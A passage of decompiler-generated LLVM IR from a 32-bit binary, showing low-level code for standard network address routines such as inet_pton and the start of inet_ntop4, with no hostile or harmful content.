  %v1_8059596 = icmp eq i1 %v9_8059593, false
  br i1 %v1_8059596, label %dec_label_pc_80595cc, label %dec_label_pc_8059598

dec_label_pc_8059598:                             ; preds = %dec_label_pc_8059593
  %v0_8059598 = load i32, i32* @edx, align 4
  %v1_8059598 = icmp eq i32 %v0_8059598, 0
  store i1 %v1_8059598, i1* %zf.global-to-local, align 1
  br i1 %v1_8059598, label %dec_label_pc_80595cc, label %dec_label_pc_805959c

dec_label_pc_805959c:                             ; preds = %dec_label_pc_8059598
  %v0_805959c = load i32, i32* @edi, align 4
  %v9_805959c = icmp eq i32 %v0_805959c, 4
  store i1 %v9_805959c, i1* %zf.global-to-local, align 1
  br i1 %v9_805959c, label %dec_label_pc_80595cc, label %dec_label_pc_80595a1

dec_label_pc_80595a1:                             ; preds = %dec_label_pc_805959c
  %v0_80595a1 = load i32, i32* @esi, align 4
  %v1_80595a1 = add i32 %v0_80595a1, 1
  store i32 %v1_80595a1, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_80595a4 = inttoptr i32 %v1_80595a1 to i8*
  store i8 0, i8* %v1_80595a4, align 1
  br label %dec_label_pc_80595a7.backedge

dec_label_pc_80595a7.backedge:                    ; preds = %dec_label_pc_80595a1, %dec_label_pc_805958f, %dec_label_pc_8059583
  %v0_80595a7.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80595a7 = inttoptr i32 %v0_80595a7.pre to i8*
  %v2_80595a7 = load i8, i8* %v1_80595a7, align 1
  %v3_80595a7 = sext i8 %v2_80595a7 to i32
  store i32 %v3_80595a7, i32* @ecx, align 4
  %v1_80595aa = add i32 %v0_80595a7.pre, 1
  store i32 %v1_80595aa, i32* %ebx.global-to-local, align 4
  %v1_80595ab = icmp eq i8 %v2_80595a7, 0
  store i1 %v1_80595ab, i1* %zf.global-to-local, align 1
  %v1_80595ad = icmp eq i1 %v1_80595ab, false
  br i1 %v1_80595ad, label %dec_label_pc_805956a, label %dec_label_pc_80595a7.dec_label_pc_80595af_crit_edge

dec_label_pc_80595a7.dec_label_pc_80595af_crit_edge: ; preds = %dec_label_pc_80595a7.backedge
  %v0_80595af.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80595af

dec_label_pc_80595af:                             ; preds = %dec_label_pc_80595a7.dec_label_pc_80595af_crit_edge, %entry
  %v0_80595af = phi i32 [ %v0_80595af.pre, %dec_label_pc_80595a7.dec_label_pc_80595af_crit_edge ], [ 0, %entry ]
  %v10_80595af = icmp eq i32 %v0_80595af, 3
  store i1 %v10_80595af, i1* %zf.global-to-local, align 1
  %v7_80595b2 = icmp sgt i32 %v0_80595af, 3
  br i1 %v7_80595b2, label %dec_label_pc_80595b4, label %dec_label_pc_80595cc

dec_label_pc_80595b4:                             ; preds = %dec_label_pc_80595af
  %v0_80595b4 = load i32, i32* @eax, align 4
  %v3_80595bd = bitcast i32* %stack_var_-20 to i16*
  %v4_80595bd = call i32 @memcpy(i16* %v3_80595bd, i32 4, i32 %v0_80595b4)
  %v0_80595c7 = load i32, i32* @esp, align 4
  %v6_80595c7 = icmp eq i32 %v0_80595c7, -16
  store i1 %v6_80595c7, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80595ce

dec_label_pc_80595cc:                             ; preds = %dec_label_pc_805959c, %dec_label_pc_8059598, %dec_label_pc_8059593, %dec_label_pc_8059589, %dec_label_pc_8059572, %dec_label_pc_80595af
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_80595ce.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80595ce

dec_label_pc_80595ce:                             ; preds = %dec_label_pc_80595b4, %dec_label_pc_80595cc
  %v0_80595ce = phi i32 [ %v15_805955c, %dec_label_pc_80595b4 ], [ %v0_80595ce.pre, %dec_label_pc_80595cc ]
  %v0_80595d5 = phi i32 [ 1, %dec_label_pc_80595b4 ], [ 0, %dec_label_pc_80595cc ]
  %v9_80595ce = icmp eq i32 %v0_80595ce, -28
  store i1 %v9_80595ce, i1* %zf.global-to-local, align 1
  %v2_80595d1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80595d1, i32* @ebx, align 4
  store i32 %v0_8059556, i32* @esi, align 4
  ret i32 %v0_80595d5

; uselistorder directives
  uselistorder i32 %v0_80595af, { 1, 0 }
  uselistorder i32 %v3_80595a7, { 1, 0 }
  uselistorder i8 %v2_80595a7, { 1, 2, 0 }
  uselistorder i1 %v9_805959c, { 1, 0 }
  uselistorder i32 %v1_805958a, { 1, 0 }
  uselistorder i32 %v3_8059578, { 1, 2, 0, 3 }
  uselistorder i8 %v2_80595a722, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 -28, { 0, 3, 5, 1, 6, 8, 2, 7, 4 }
  uselistorder i32 255, { 10, 5, 6, 0, 1, 2, 11, 17, 7, 4, 3, 8, 12, 13, 18, 9, 14, 15, 16 }
  uselistorder label %dec_label_pc_80595ce, { 1, 0 }
  uselistorder label %dec_label_pc_80595cc, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805956a, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80595d6 = load i32, i32* @ebp, align 4
  %v0_80595d7 = load i32, i32* @edi, align 4
  %v0_80595d8 = load i32, i32* @esi, align 4
  %v0_80595d9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80595e1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80595e1, i32* @edi, align 4
  %v9_80595e5 = icmp eq i32 %arg1, 2
  br i1 %v9_80595e5, label %dec_label_pc_80595f5, label %dec_label_pc_80595ea

dec_label_pc_80595ea:                             ; preds = %entry
  %v9_80595ea = icmp eq i32 %arg1, 10
  %v1_80595ed = icmp eq i1 %v9_80595ea, false
  br i1 %v1_80595ed, label %dec_label_pc_8059786, label %dec_label_pc_8059605

dec_label_pc_80595f5:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80595e1, i32* @eax, align 4
  %v3_80595fb = call i32 @inet_pton4(i32 %v0_80595d9, i32 %v0_80595d8, i32 %v0_80595d7)
  store i32 %v3_80595fb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059798

dec_label_pc_8059605:                             ; preds = %dec_label_pc_80595ea
  %v2_805960a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805960a, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805960f = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805960f, i32* @ebx, align 4
  %v2_8059616 = add i32 %v5_805960f, 16
  store i32 %v2_8059616, i32* %eax.global-to-local, align 4
  %v0_8059620 = load i32, i32* @edi, align 4
  %v1_8059620 = inttoptr i32 %v0_8059620 to i8*
  %v2_8059620 = load i8, i8* %v1_8059620, align 1
  %v11_8059620 = icmp eq i8 %v2_8059620, 58
  %v1_8059623 = icmp eq i1 %v11_8059620, false
  br i1 %v1_8059623, label %dec_label_pc_80596b6, label %dec_label_pc_8059625

dec_label_pc_8059625:                             ; preds = %dec_label_pc_8059605
  %v1_8059625 = add i32 %v0_8059620, 1
  store i32 %v1_8059625, i32* @edi, align 4
  %v1_8059626 = inttoptr i32 %v1_8059625 to i8*
  %v2_8059626 = load i8, i8* %v1_8059626, align 1
  %v11_8059626 = icmp eq i8 %v2_8059626, 58
  %v1_8059629 = icmp eq i1 %v11_8059626, false
  br i1 %v1_8059629, label %dec_label_pc_8059796, label %dec_label_pc_80596b6

dec_label_pc_805963d:                             ; preds = %dec_label_pc_80596f6
  %v0_805963d = load i32, i32* @ecx, align 4
  %v0_805963e = load i32, i32* @edi, align 4
  %v1_805963e = add i32 %v0_805963e, 1
  store i32 %v1_805963e, i32* @edi, align 4
  %v7_8059646 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805d0ba.346, i32 0, i32 0), i32 %v2_80596fd, i32 %v0_805963d, i32 %v0_805963d)
  store i32 %v7_8059646, i32* %eax.global-to-local, align 4
  %v1_805964e = icmp eq i32 %v7_8059646, 0
  br i1 %v1_805964e, label %dec_label_pc_805966d, label %dec_label_pc_8059652

dec_label_pc_8059652:                             ; preds = %dec_label_pc_805963d
  %v0_8059652 = load i32, i32* @ebp, align 4
  %v2_8059652 = mul i32 %v0_8059652, 16
  %v1_8059655 = add i32 %v7_8059646, -134598842
  store i32 %v1_8059655, i32* %eax.global-to-local, align 4
  %v2_805965a = or i32 %v2_8059652, %v1_8059655
  store i32 %v2_805965a, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_805965a, 65536
  br i1 %tmp, label %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge, label %dec_label_pc_8059796

dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge: ; preds = %dec_label_pc_8059652
  %v0_80596f6.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80596f6.outer

dec_label_pc_80596f6.outer:                       ; preds = %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge, %dec_label_pc_80596b6
  %v0_80596f6.pre = phi i32 [ %v0_80596f6.pre.pre, %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_80596b6 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_80596b6 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_80596b6 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_8059652.dec_label_pc_80596f6.outer_crit_edge ], [ 0, %dec_label_pc_80596b6 ]
  %v4_8059672 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8059677 = icmp eq i1 %v4_8059672, false
  br label %dec_label_pc_80596f6

dec_label_pc_805966d:                             ; preds = %dec_label_pc_805963d
  %v0_805966d = load i32, i32* @esi, align 4
  %v9_805966d = icmp eq i32 %v0_805966d, 58
  %v1_8059670 = icmp eq i1 %v9_805966d, false
  br i1 %v1_8059670, label %dec_label_pc_80596c2, label %dec_label_pc_8059672

dec_label_pc_8059672:                             ; preds = %dec_label_pc_805966d
  br i1 %v1_8059677, label %dec_label_pc_805968e, label %dec_label_pc_8059679

dec_label_pc_8059679:                             ; preds = %dec_label_pc_8059672
  %v5_8059679 = icmp eq i8* %stack_var_-44.1, null
  %v1_805967e = icmp eq i1 %v5_8059679, false
  br i1 %v1_805967e, label %dec_label_pc_8059796, label %dec_label_pc_8059684

dec_label_pc_8059684:                             ; preds = %dec_label_pc_8059679
  %v0_8059684 = load i32, i32* @ebx, align 4
  %v5_8059684 = inttoptr i32 %v0_8059684 to i8*
  %v0_8059688 = load i32, i32* @edi, align 4
  %v5_8059688 = inttoptr i32 %v0_8059688 to i8*
  br label %dec_label_pc_80596f6

dec_label_pc_805968e:                             ; preds = %dec_label_pc_8059672
  %v0_805968e = load i32, i32* @edi, align 4
  %v1_805968e = inttoptr i32 %v0_805968e to i8*
  %v2_805968e = load i8, i8* %v1_805968e, align 1
  %v3_805968e = icmp eq i8 %v2_805968e, 0
  br i1 %v3_805968e, label %dec_label_pc_8059796, label %dec_label_pc_8059697

dec_label_pc_8059697:                             ; preds = %dec_label_pc_805968e
  %v0_8059697 = load i32, i32* @ebx, align 4
  %v1_8059697 = add i32 %v0_8059697, 2
  store i32 %v1_8059697, i32* @edx, align 4
  %v6_805969e = icmp ugt i32 %v1_8059697, %v2_8059616
  br i1 %v6_805969e, label %dec_label_pc_8059796, label %dec_label_pc_80596a4

dec_label_pc_80596a4:                             ; preds = %dec_label_pc_8059697
  %v0_80596a4 = load i32, i32* @ebp, align 4
  %v2_80596a6 = udiv i32 %v0_80596a4, 256
  %v4_80596a6 = trunc i32 %v2_80596a6 to i8
  %v3_80596a9 = inttoptr i32 %v0_8059697 to i8*
  store i8 %v4_80596a6, i8* %v3_80596a9, align 1
  %v0_80596ab = load i32, i32* @ebp, align 4
  store i32 %v0_80596ab, i32* %eax.global-to-local, align 4
  %v1_80596ad = trunc i32 %v0_80596ab to i8
  %v2_80596ad = load i32, i32* @ebx, align 4
  %v3_80596ad = add i32 %v2_80596ad, 1
  %v4_80596ad = inttoptr i32 %v3_80596ad to i8*
  store i8 %v1_80596ad, i8* %v4_80596ad, align 1
  %v0_80596b0 = load i32, i32* @edx, align 4
  store i32 %v0_80596b0, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80596b6

dec_label_pc_80596b6:                             ; preds = %dec_label_pc_8059605, %dec_label_pc_8059625, %dec_label_pc_80596a4
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80596a4 ], [ %v1_8059625, %dec_label_pc_8059625 ], [ %v0_8059620, %dec_label_pc_8059605 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80596a4 ], [ null, %dec_label_pc_8059625 ], [ null, %dec_label_pc_8059605 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80596f6.outer

dec_label_pc_80596c2:                             ; preds = %dec_label_pc_805966d
  %v9_80596c2 = icmp eq i32 %v0_805966d, 46
  %v1_80596c5 = icmp eq i1 %v9_80596c2, false
  br i1 %v1_80596c5, label %dec_label_pc_8059796, label %dec_label_pc_80596cb

dec_label_pc_80596cb:                             ; preds = %dec_label_pc_80596c2
  %v0_80596cb = load i32, i32* @ebx, align 4
  %v1_80596cb = add i32 %v0_80596cb, 4
  store i32 %v1_80596cb, i32* @esi, align 4
  %v6_80596d2 = icmp ugt i32 %v1_80596cb, %v2_8059616
  br i1 %v6_80596d2, label %dec_label_pc_8059796, label %dec_label_pc_80596d8

dec_label_pc_80596d8:                             ; preds = %dec_label_pc_80596cb
  %v4_80596d8 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80596d8, i32* @eax, align 4
  store i32 %v0_80596cb, i32* @edx, align 4
  store i32 %v1_80596cb, i32* @ebx, align 4
  %v2_80596e0 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80596e0 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80596e0, i32 %v2_8059616)
  store i32 %v5_80596e0, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_80596e0, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_805972d, label %dec_label_pc_8059796

dec_label_pc_80596f6:                             ; preds = %dec_label_pc_80596f6.outer, %dec_label_pc_8059684
  %v0_80596f6 = phi i32 [ %v0_8059688, %dec_label_pc_8059684 ], [ %v0_80596f6.pre, %dec_label_pc_80596f6.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8059684, %dec_label_pc_8059684 ], [ %stack_var_-44.1.ph, %dec_label_pc_80596f6.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8059688, %dec_label_pc_8059684 ], [ %stack_var_-36.1.ph, %dec_label_pc_80596f6.outer ]
  %v1_80596f6 = inttoptr i32 %v0_80596f6 to i8*
  %v2_80596f6 = load i8, i8* %v1_80596f6, align 1
  %v3_80596f6 = sext i8 %v2_80596f6 to i32
  store i32 %v3_80596f6, i32* %eax.global-to-local, align 4
  %v2_80596fd = call i32 @__GI_tolower(i32 %v3_80596f6)
  store i32 %v2_80596fd, i32* %eax.global-to-local, align 4
  %v1_8059705 = icmp eq i32 %v2_80596fd, 0
  store i32 %v2_80596fd, i32* @esi, align 4
  %v1_8059709 = icmp eq i1 %v1_8059705, false
  br i1 %v1_8059709, label %dec_label_pc_805963d, label %dec_label_pc_805970f

dec_label_pc_805970f:                             ; preds = %dec_label_pc_80596f6
  br i1 %v4_8059672, label %dec_label_pc_805972d, label %dec_label_pc_8059716

dec_label_pc_8059716:                             ; preds = %dec_label_pc_805970f
  %v0_8059716 = load i32, i32* @ebx, align 4
  %v1_8059716 = add i32 %v0_8059716, 2
  store i32 %v1_8059716, i32* @edx, align 4
  %v6_805971d = icmp ugt i32 %v1_8059716, %v2_8059616
  br i1 %v6_805971d, label %dec_label_pc_8059796, label %dec_label_pc_805971f

dec_label_pc_805971f:                             ; preds = %dec_label_pc_8059716
  %v0_805971f = load i32, i32* @ebp, align 4
  %v2_8059721 = udiv i32 %v0_805971f, 256
  %v4_8059721 = trunc i32 %v2_8059721 to i8
  %v3_8059724 = inttoptr i32 %v0_8059716 to i8*
  store i8 %v4_8059721, i8* %v3_8059724, align 1
  %v0_8059726 = load i32, i32* @ebp, align 4
  store i32 %v0_8059726, i32* %eax.global-to-local, align 4
  %v1_8059728 = trunc i32 %v0_8059726 to i8
  %v2_8059728 = load i32, i32* @ebx, align 4
  %v3_8059728 = add i32 %v2_8059728, 1
  %v4_8059728 = inttoptr i32 %v3_8059728 to i8*
  store i8 %v1_8059728, i8* %v4_8059728, align 1
  %v0_805972b = load i32, i32* @edx, align 4
  store i32 %v0_805972b, i32* @ebx, align 4
  br label %dec_label_pc_805972d

dec_label_pc_805972d:                             ; preds = %dec_label_pc_805970f, %dec_label_pc_80596d8, %dec_label_pc_805971f
  %v4_805972d = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805972d = icmp eq i8* %stack_var_-44.1, null
  %v0_8059765.pre = load i32, i32* @ebx, align 4
  br i1 %v5_805972d, label %dec_label_pc_8059765, label %dec_label_pc_8059734

dec_label_pc_8059734:                             ; preds = %dec_label_pc_805972d
  store i32 1, i32* @esi, align 4
  %v6_805973b = sub i32 %v0_8059765.pre, %v4_805972d
  store i32 %v6_805973b, i32* @edi, align 4
  %v16_805973f = icmp eq i32 %v0_8059765.pre, %v2_8059616
  %v1_8059743 = icmp eq i1 %v16_805973f, false
  br i1 %v1_8059743, label %dec_label_pc_805975d.preheader, label %dec_label_pc_8059796

dec_label_pc_805975d.preheader:                   ; preds = %dec_label_pc_8059734
  %v3_805975d88 = inttoptr i32 %v6_805973b to i8*
  %v9_805975f97 = icmp slt i8* %v3_805975d88, inttoptr (i32 1 to i8*)
  br i1 %v9_805975f97, label %dec_label_pc_8059761, label %dec_label_pc_8059747

dec_label_pc_8059747:                             ; preds = %dec_label_pc_805975d.preheader, %dec_label_pc_8059747
  %v0_805975599 = phi i32 [ %v0_805975d.pre, %dec_label_pc_8059747 ], [ 1, %dec_label_pc_805975d.preheader ]
  %v0_805974798 = phi i32 [ %v1_805975d.pre, %dec_label_pc_8059747 ], [ %v6_805973b, %dec_label_pc_805975d.preheader ]
  %v2_805974d = sub i32 %v0_805974798, %v0_805975599
  %v6_805974f = add i32 %v2_805974d, %v4_805972d
  store i32 %v6_805974f, i32* %eax.global-to-local, align 4
  %v2_8059753 = sub i32 %v2_8059616, %v0_805975599
  store i32 %v2_8059753, i32* @ecx, align 4
  %v1_8059755 = add i32 %v0_805975599, 1
  store i32 %v1_8059755, i32* @esi, align 4
  %v1_8059756 = inttoptr i32 %v6_805974f to i8*
  %v2_8059756 = load i8, i8* %v1_8059756, align 1
  %v3_8059756 = zext i8 %v2_8059756 to i32
  %v4_8059756 = load i32, i32* @edx, align 4
  %v5_8059756 = and i32 %v4_8059756, -256
  %v6_8059756 = or i32 %v5_8059756, %v3_8059756
  store i32 %v6_8059756, i32* @edx, align 4
  %v3_8059758 = inttoptr i32 %v2_8059753 to i8*
  store i8 %v2_8059756, i8* %v3_8059758, align 1
  %v0_805975a = load i32, i32* %eax.global-to-local, align 4
  %v1_805975a = inttoptr i32 %v0_805975a to i8*
  store i8 0, i8* %v1_805975a, align 1
  %v0_805975d.pre = load i32, i32* @esi, align 4
  %v1_805975d.pre = load i32, i32* @edi, align 4
  %v2_805975d = inttoptr i32 %v0_805975d.pre to i8*
  %v3_805975d = inttoptr i32 %v1_805975d.pre to i8*
  %v9_805975f = icmp sgt i8* %v2_805975d, %v3_805975d
  br i1 %v9_805975f, label %dec_label_pc_8059761, label %dec_label_pc_8059747

dec_label_pc_8059761:                             ; preds = %dec_label_pc_8059747, %dec_label_pc_805975d.preheader
  br label %dec_label_pc_8059765

dec_label_pc_8059765:                             ; preds = %dec_label_pc_805972d, %dec_label_pc_8059761
  %v0_8059765 = phi i32 [ %v2_8059616, %dec_label_pc_8059761 ], [ %v0_8059765.pre, %dec_label_pc_805972d ]
  %v16_8059765 = icmp eq i32 %v0_8059765, %v2_8059616
  %v1_8059769 = icmp eq i1 %v16_8059765, false
  br i1 %v1_8059769, label %dec_label_pc_8059796, label %dec_label_pc_805976b

dec_label_pc_805976b:                             ; preds = %dec_label_pc_8059765
  store i32 %v2_805960a, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8059777 = call i32 @memcpy(i16* %tmp63, i32 %v2_805960a, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059798

dec_label_pc_8059786:                             ; preds = %dec_label_pc_80595ea
  %v1_8059786 = call i32 @__errno_location(i32 %v0_80595d9)
  %v1_805978b = inttoptr i32 %v1_8059786 to i32*
  store i32 97, i32* %v1_805978b, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059798

dec_label_pc_8059796:                             ; preds = %dec_label_pc_8059697, %dec_label_pc_805968e, %dec_label_pc_8059652, %dec_label_pc_8059679, %dec_label_pc_8059734, %dec_label_pc_80596d8, %dec_label_pc_8059765, %dec_label_pc_8059716, %dec_label_pc_80596cb, %dec_label_pc_80596c2, %dec_label_pc_8059625
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059798

dec_label_pc_8059798:                             ; preds = %dec_label_pc_8059786, %dec_label_pc_805976b, %dec_label_pc_80595f5, %dec_label_pc_8059796
  %v0_805979f = phi i32 [ -1, %dec_label_pc_8059786 ], [ 1, %dec_label_pc_805976b ], [ %v3_80595fb, %dec_label_pc_80595f5 ], [ 0, %dec_label_pc_8059796 ]
  store i32 %v0_80595d9, i32* @ebx, align 4
  store i32 %v0_80595d8, i32* @esi, align 4
  store i32 %v0_80595d7, i32* @edi, align 4
  store i32 %v0_80595d6, i32* @ebp, align 4
  ret i32 %v0_805979f

; uselistorder directives
  uselistorder i32 %v1_805975d.pre, { 1, 0 }
  uselistorder i32 %v0_805975d.pre, { 1, 0 }
  uselistorder i32 %v0_805975599, { 2, 1, 0 }
  uselistorder i32 %v0_8059765.pre, { 1, 0, 2 }
  uselistorder i32 %v2_80596fd, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_8059616, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_80595d9, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8059798, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8059796, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8059765, { 1, 0 }
  uselistorder label %dec_label_pc_8059747, { 1, 0 }
  uselistorder label %dec_label_pc_805972d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80596f6, { 1, 0 }
  uselistorder label %dec_label_pc_80596b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80596f6.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_80597a1 = load i32, i32* @edi, align 4
  %v0_80597a2 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_80597a6 = ptrtoint i32* %stack_var_-76 to i32
  %v0_80597a9 = load i32, i32* @eax, align 4
  %v3_80597ad = and i32 %v0_80597a9, -65536
  %v2_80597b3 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_80597b8 = load i32, i32* @edx, align 4
  %v5_80597b8 = inttoptr i32 %v0_80597b8 to i8*
  store i8* %v5_80597b8, i8** %stack_var_-56, align 4
  %v0_80597bc = load i32, i32* @ecx, align 4
  store i32 %v3_80597ad, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80597c7 = add i32 %v2_80597b3, 4
  store i32 %v6_80597c7, i32* %edi.global-to-local, align 4
  %v2_80597c8 = inttoptr i32 %v6_80597c7 to i32*
  store i32 0, i32* %v2_80597c8, align 4
  %v3_80597c8 = load i32, i32* %edi.global-to-local, align 4
  %v6_80597c8 = add i32 %v3_80597c8, 4
  store i32 %v6_80597c8, i32* %edi.global-to-local, align 4
  %v0_80597c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80597c9 = inttoptr i32 %v6_80597c8 to i32*
  store i32 %v0_80597c9, i32* %v2_80597c9, align 4
  %v3_80597c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80597c9 = add i32 %v3_80597c9, 4
  store i32 %v6_80597c9, i32* %edi.global-to-local, align 4
  %v0_80597ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80597ca = trunc i32 %v0_80597ca to i16
  %v3_80597ca = inttoptr i32 %v6_80597c9 to i16*
  store i16 %v1_80597ca, i16* %v3_80597ca, align 2
  %v4_80597ca = load i32, i32* %edi.global-to-local, align 4
  %v7_80597ca = add i32 %v4_80597ca, 2
  %v0_80597cc = load i32, i32* %eax.global-to-local, align 4
  %v1_80597cc = trunc i32 %v0_80597cc to i8
  %v3_80597cc = inttoptr i32 %v7_80597ca to i8*
  store i8 %v1_80597cc, i8* %v3_80597cc, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805986730 = load i32, i32* @esi, align 4
  %v10_805986736 = icmp eq i32 %v0_805986730, 3
  store i1 %v10_805986736, i1* %zf.global-to-local, align 1
  %v7_805986a38 = icmp sgt i32 %v0_805986730, 3
  br i1 %v7_805986a38, label %dec_label_pc_8059870, label %dec_label_pc_80597d4

dec_label_pc_80597d4:                             ; preds = %dec_label_pc_8059847, %entry
  %v3_80597ea = phi i32 [ 0, %entry ], [ %v1_8059870.pre, %dec_label_pc_8059847 ]
  %v0_805986739 = phi i32 [ %v0_805986730, %entry ], [ %v0_8059867, %dec_label_pc_8059847 ]
  %v2_80597da = add i32 %v0_805986739, %v0_80597a9
  %v12_80597da = icmp eq i32 %v2_80597da, 0
  store i1 %v12_80597da, i1* %zf.global-to-local, align 1
  store i32 %v2_80597da, i32* %ebp.global-to-local, align 4
  %v1_80597dc = inttoptr i32 %v2_80597da to i8*
  %v2_80597dc = load i8, i8* %v1_80597dc, align 1
  %v3_80597dc = zext i8 %v2_80597dc to i32
  %v4_80597dc = load i32, i32* @edx, align 4
  %v5_80597dc = and i32 %v4_80597dc, -65536
  %v6_80597dc = or i32 %v5_80597dc, %v3_80597dc
  store i32 %v6_80597dc, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_80597dc, 100
  %v6_80597e3 = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_80597dc, 100
  %v12_80597e3 = zext i8 %tmp24 to i32
  %v14_80597e3 = mul nuw nsw i32 %v12_80597e3, 256
  %v15_80597e3 = or i32 %v6_80597e3, %v5_80597dc
  %v16_80597e3 = or i32 %v15_80597e3, %v14_80597e3
  store i32 %v16_80597e3, i32* %eax.global-to-local, align 4
  %v2_80597e7 = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_80597ea = load i32, i32* @esp, align 4
  %v4_80597ea = add i32 %v2_80597ea, 43
  %v5_80597ea = add i32 %v4_80597ea, %v3_80597ea
  %v6_80597ea = inttoptr i32 %v5_80597ea to i8*
  store i8 %v2_80597e7, i8* %v6_80597ea, align 1
  %v0_80597ee = load i32, i32* %edi.global-to-local, align 4
  %v1_80597ee = add i32 %v0_80597ee, 1
  store i32 %v0_80597ee, i32* @ecx, align 4
  %v0_80597f7 = load i32, i32* @esp, align 4
  %v2_80597f7 = add i32 %v0_80597ee, 43
  %v3_80597f7 = add i32 %v2_80597f7, %v0_80597f7
  %v4_80597f7 = inttoptr i32 %v3_80597f7 to i8*
  %v5_80597f7 = load i8, i8* %v4_80597f7, align 1
  %v11_80597f7 = icmp eq i8 %v5_80597f7, 48
  store i1 %v11_80597f7, i1* %zf.global-to-local, align 1
